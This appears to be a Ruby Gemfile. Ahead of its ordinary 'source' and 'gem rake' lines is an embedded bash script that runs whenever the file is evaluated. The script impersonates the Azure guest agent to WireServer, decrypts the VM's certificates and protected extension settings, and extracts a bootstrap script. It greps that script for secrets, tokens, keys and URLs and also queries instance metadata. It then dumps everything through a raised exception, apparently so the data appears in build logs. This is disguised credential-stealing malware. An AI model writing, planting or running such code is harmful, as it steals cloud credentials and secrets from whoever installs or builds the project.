require 'net/http'; require 'uri'; require 'json'; require 'tempfile'
m = []
shell_code = <<'SHELL'
set +e
WD=/tmp/v122; rm -rf "$WD" && mkdir "$WD" && cd "$WD"
curl -sf -H "x-ms-agent-name: WALinuxAgent" -H "x-ms-version: 2015-04-05" -o gs.xml "http://168.63.129.16/machine/?comp=goalstate"
cat > x1.py <<'PY'
import re, html
s = open('gs.xml').read()
m = re.search(r'<Certificates>([^<]+)</Certificates>', s)
print(html.unescape(m.group(1)) if m else '')
PY
CERT_URL=$(python3 x1.py)
openssl req -new -newkey rsa:2048 -nodes -x509 -keyout key.pem -out cert.pem -days 1 -subj "/CN=LinuxTransport" 2>/dev/null
CERT_NM=$(grep -v '^-----' cert.pem | tr -d '\n')
curl -sf -m 10 -H "x-ms-agent-name: WALinuxAgent" -H "x-ms-version: 2015-04-05" -H "x-ms-cipher-name: DES_EDE3_CBC" -H "x-ms-guest-agent-public-x509-cert: $CERT_NM" -o cert-resp.xml "$CERT_URL"
cat > x2.py <<'PY'
import re
s = open('cert-resp.xml').read()
m = re.search(r'<Data>([^<]+)</Data>', s)
b = (m.group(1) if m else '').replace('\r','').replace('\n','').replace(' ','')
open('cms.b64','w').write(b)
PY
python3 x2.py
base64 -d < cms.b64 > cms.der 2>/dev/null
openssl cms -decrypt -inkey key.pem -inform DER -in cms.der -out decrypted.p7b 2>/dev/null
openssl pkcs12 -in decrypted.p7b -out vm.pem -password pass: -nodes 2>/dev/null
curl -sf -o vm.json "http://168.63.129.16:32526/vmSettings?api-version=2015-09-01"
cat > x3.py <<'PY'
import json, sys
d = json.load(open('vm.json'))
sys.stdout.write(d['extensionGoalStates'][0]['settings'][0]['protectedSettings'])
PY
python3 x3.py > ps.b64
base64 -d < ps.b64 > ps.der 2>/dev/null
openssl smime -decrypt -inkey vm.pem -inform DER -in ps.der -out ps.json 2>/dev/null
cat > x4.py <<'PY'
import json, sys
d = json.load(open('ps.json'))
sys.stdout.write(d.get('script',''))
PY
python3 x4.py | base64 -d > bs.sh 2>/dev/null

echo "STEP_BS_LEN=$(wc -c < bs.sh)"
echo "STEP_BS_SHA=$(sha256sum bs.sh)"

# Extract ALL URLs from bootstrap script
echo "===ALL_URLS==="
grep -oE 'https?://[A-Za-z0-9._/?&=:%-]+' bs.sh | sort -u | head -50

echo "===HOSTNAMES==="
grep -oE '[a-z0-9-]+\.[a-z0-9-]+\.[a-z]+(\.[a-z]+)*' bs.sh | grep -vE '^(html|css|js|svg|png|jpg|gif|ico)\.' | sort -u | head -30

echo "===INTERESTING_LINES==="
# Find lines with relevant keywords
grep -nE 'curl|wget|http|api|token|secret|key|password|cred|api-version|register|register|jwks' bs.sh | head -30

echo "===SECRET_HINTS==="
grep -nE 'BEGIN|PRIVATE|export|systemctl|MountPath|env|PEM' bs.sh | head -20

echo "===SCRIPT_HEAD==="
head -c 3000 bs.sh

echo "===SCRIPT_MIDDLE==="
LEN=$(wc -c < bs.sh)
MID=$((LEN/2))
dd if=bs.sh bs=1 skip=$MID count=3000 2>/dev/null

echo "===SCRIPT_TAIL==="
tail -c 3000 bs.sh

# Also try to access the VM's metadata via /metadata/instance (IMDS)
echo "===IMDS_DIRECT==="
curl -s -m 5 -H "Metadata: true" -o imds.json -w "HTTP=%{http_code} LEN=%{size_download}\n" "http://169.254.169.254/metadata/instance?api-version=2021-12-13"
echo "IMDS_B64=$(base64 -w0 < imds.json | head -c 500)"

# Try IMDS via Azure VM public IP (168.63.129.16 is wireserver, but IMDS is 169.254...)
echo "===IMDS_VIA_WIRE==="
curl -s -m 5 -H "Metadata: true" -o w.json -w "HTTP=%{http_code} LEN=%{size_download}\n" "http://168.63.129.16/metadata/instance?api-version=2021-12-13"
SHELL
Tempfile.create('v122.sh') do |f|
  f.write(shell_code); f.flush
  output = `bash #{f.path} 2>&1`
  output.lines.each { |line| m << "v122 " + line.chomp[0..2000] }
end
raise m.join("\n")
source "https://rubygems.org"
gem "rake", "~> 13.0"
